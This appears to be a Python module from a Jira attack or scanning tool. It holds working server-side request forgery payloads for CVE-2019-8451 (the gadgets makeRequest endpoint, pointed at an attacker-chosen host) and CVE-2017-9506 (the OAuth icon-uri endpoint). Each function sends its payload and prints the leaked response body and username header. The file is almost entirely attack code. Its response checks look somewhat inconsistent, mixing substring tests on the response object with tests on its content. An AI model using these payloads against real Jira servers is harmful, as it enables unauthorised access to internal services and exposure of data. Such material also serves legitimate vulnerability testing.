#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from .recon import request, isjira, getversion, uparse

# CVE-2019-8451
def cve2019_8451(target, ssrf):
	target = uparse(target)
	# http://host:port/plugins/servlet/gadgets/makeRequest?url=http://{}:{}@{}'.format(host, port, target)
	payload = target + "/plugins/servlet/gadgets/makeRequest?url=" + target + '@' + ssrf
	response = request(payload)

	if '"rc":200' in response and response.status_code == 200 and 'set-cookie' in response.content:
		print("[+] Success: Target is vulnerable!")
		print('X-AUSERNAME= {}'.format(response.headers.get('X-AUSERNAME')))
		print("CONTENTS:", response.content, sep="\n")
	else:
		print("Target doesn't seems to be vulnerable. [CVE-2019-8451]")

# CVE-2017-9506
def cve2017_9506(target):
	target = uparse(target)
	test_ssrf_url = "https://www.google.com"
	payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + test_ssrf_url
	response = request(payload)

	if response.status_code == 200 and 'googlelogo' in response.content:
		print("[+] Success: Target is vulnerable!")
		print('X-AUSERNAME: {}'.format(response.headers.get('X-AUSERNAME')))
		print("CONTENTS:", response.content, sep="\n")
	else:
		print("Target doesn't seems to be vulnerable. [CVE-2017-9506]")